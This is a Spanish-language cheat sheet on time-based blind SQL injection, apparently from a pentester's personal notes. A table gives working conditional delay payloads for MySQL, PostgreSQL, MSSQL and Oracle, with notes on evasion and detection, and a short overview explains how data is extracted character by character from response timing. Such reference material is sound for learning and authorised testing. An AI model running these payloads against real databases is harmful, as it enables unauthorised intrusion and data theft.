---
aliases:
tags:
  - type/cheatsheet
primary categories:
secondary categories:
tertiary categories:
type: CheatSheet
linked:
  - "[[SQL Injection (SQLi)]]"
---
# SQLi - Time based

***

## Cheatsheet

|      **SGBD**      | **Función de Retardo** |                        **Payload Estructural (Inferencia Condicional)**                         |                                             **Lógica de Ejecución**                                              |                                                               **Consideraciones de Red / WAF**                                                                |
|:------------------:|:----------------------:|:-----------------------------------------------------------------------------------------------:|:----------------------------------------------------------------------------------------------------------------:|:-------------------------------------------------------------------------------------------------------------------------------------------------------------:|
| <br><br>**MySQL**  |   <br><br>`SLEEP()`    |            <br>`AND IF(ASCII(SUBSTRING((SELECT database()),1,1))=115, SLEEP(5), 0)`             |     <br>Evalúa la condición; si es verdadera, fuerza al hilo de ejecución a pausarse por 5 segundos.<br><br>     |                                   <br>Vector estándar. Fácilmente detectable por herramientas de monitoreo de rendimiento.                                    |
| <br><br>**MySQL**  | <br><br>`BENCHMARK()`  |                    <br><br>`AND IF(1=1, BENCHMARK(5000000, MD5('test')), 0)`                    |  <br>Fuerza una carga de procesamiento matemático pesado repetitivo en lugar de usar una pausa nativa.<br><br>   |                              <br>Útil si la función `SLEEP()` está deshabilitada o filtrada. Causa picos de CPU en el servidor.                               |
| <br>**PostgreSQL** |    <br>`pg_sleep()`    |            <br>`AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)`             | <br>Utiliza la estructura `CASE WHEN` para ramificar la ejecución del retraso de tiempo de forma segura.<br><br> |                           <br>Requiere que las consultas inyectadas manejen estrictamente los tipos de datos en los bloques `CASE`.                           |
|   <br>**MSSQL**    |  <br>`WAITFOR DELAY`   |          <br>`IF (ASCII(SUBSTRING((SELECT @@version),1,1))=115) WAITFOR DELAY '0:0:5'`          |  <br>Detiene la ejecución del bloque actual, lote o procedimiento almacenado hasta que pase el tiempo.<br><br>   | <br>Sintaxis estricta que no puede usarse directamente dentro de una sentencia `SELECT` simple; a menudo requiere apilamiento de consultas (stacked queries). |
| <br><br>**Oracle** |  <br><br>`DBMS_PIPE`   | <br>`AND 1=(SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END FROM dual)` |         <br>Abusa de la recepción de mensajes de tubería, esperando hasta que el timeout expire.<br><br>         |                          <br>Evita el uso de `dbms_lock.sleep`, el cual generalmente requiere privilegios de DBA para ser ejecutado.                          |
^sqli-time

___

## Overview

El [[Time-based Blind SQLi]] es el vector inferencial de último recurso. Lo aplico en escenarios de ceguera absoluta, donde la aplicación no refleja resultados en el frontend ni altera su comportamiento, tamaño o código HTTP ante consultas lógicas verdaderas o falsas.

La metodología consiste en inyectar operaciones de retraso temporal condicionadas. Si la subconsulta evalúa a verdadero (`TRUE`), el motor de base de datos pausa la ejecución durante `n` segundos antes de responder. Al medir la latencia de la respuesta HTTP, puedo inferir de manera determinista la validez de mi consulta y extraer información carácter por carácter, aunque este canal es extremadamente lento y susceptible a falsos positivos por la inestabilidad inherente de la red.


***
